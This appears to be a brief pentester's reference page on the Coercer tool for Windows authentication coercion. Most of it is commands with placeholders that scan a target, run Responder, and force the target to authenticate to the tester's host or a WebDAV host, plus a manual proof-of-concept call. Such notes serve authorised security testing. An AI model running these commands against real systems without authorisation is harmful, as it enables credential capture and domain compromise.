---
tags:
  - tool
---
# Coercer

[Coercer](https://github.com/p0dalirius/Coercer) is a powerful `authentication coercion` tool that automates the abuse of 17 methods in 5 `RPC` protocols.

## Capabilities

```powershell
# Scan a target, responder not required
coercer scan -t $IP -u '$USER' -p '$PASSWD' -d $DOMAIN -v

# Start responder
sudo responder -I ens192

# Coerce the target
coercer coerce -t $IP -l $OUR_IP -u '$USER' -p '$PASSWD' -d $DOMAIN -v --always-continue
```

### Coerce HTTP

```powershell
python3 Coercer.py -t $IP -u '$USER' -p '$PASSWD' -wh $WEBDAV_HOSTNAME -wp 80 -v
```

### Misc

Each method used can be performed manually using [this](https://github.com/p0dalirius/windows-coerced-authentication-methods) repo, for example:

```powershell
python3 coerce_poc.py -u '$USER' -p '$PASSWD' -d $DOMAIN $OUR_IP $IP
```
